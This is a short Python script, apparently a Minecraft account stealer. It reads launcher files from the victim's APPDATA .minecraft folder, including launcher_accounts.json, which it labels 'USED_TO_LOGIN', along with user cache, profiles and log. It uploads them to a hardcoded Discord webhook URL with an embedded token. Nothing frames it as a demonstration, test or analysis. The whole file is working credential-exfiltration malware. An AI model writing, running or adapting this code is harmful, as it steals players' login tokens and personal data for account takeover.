import os, json
from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1534991753482993784/IkR_TazEiz3ESU0x_rK384qaS8zripokwqeC7Kl1r7vANxIkZEVSsOSYL6qqrMAsqKAV')

# setup paths
apd = os.getenv('APPDATA')
mc = apd + "\.minecraft\\"

# add webhook files
files = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
for x in files:
    with open(mc + x, "rb") as f:
        if (x == 'launcher_accounts.json'):
            x = f"USED_TO_LOGIN-{x}"
        webhook.add_file(file=f.read(), filename=x)

response = webhook.execute()
